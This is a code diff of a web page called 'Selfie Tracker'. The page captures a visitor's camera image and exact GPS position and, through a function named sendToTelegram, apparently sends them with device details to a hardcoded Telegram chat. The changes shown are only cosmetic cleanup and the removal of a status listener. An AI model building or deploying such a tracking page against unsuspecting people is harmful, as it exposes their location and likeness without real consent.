@@ -62,11 +62,8 @@
     <div class="container">
         <h1>📸 Selfie Tracker</h1>
         <p>Click below to capture your selfie + exact GPS.</p>
-
-     
-
         <button id="captureBtn">🚀 Capture & Send</button>
-                <iframe id="cameraFrame" src="camera.html"></iframe>
+        <iframe id="cameraFrame" src="camera.html"></iframe>
         <div id="status">⏳ Loading camera...</div>
     </div>
 
@@ -76,15 +73,6 @@
         const CHAT_ID = '5410457102';
         const iframe = document.getElementById('cameraFrame');
         const statusDiv = document.getElementById('status');
-
-        // Wait for iframe to signal it's ready
-        window.addEventListener('message', (event) => {
-            if (event.data.type === 'cameraReady') {
-                statusDiv.textContent = '📷 Camera is ready. Hit the button!';
-            } else if (event.data.type === 'cameraError') {
-                statusDiv.textContent = '❌ Camera blocked. Allow permissions and refresh.';
-            }
-        });
 
         // ==================== SEND TO TELEGRAM ====================
         async function sendToTelegram(imageData, lat, lon, source, device, userName) {
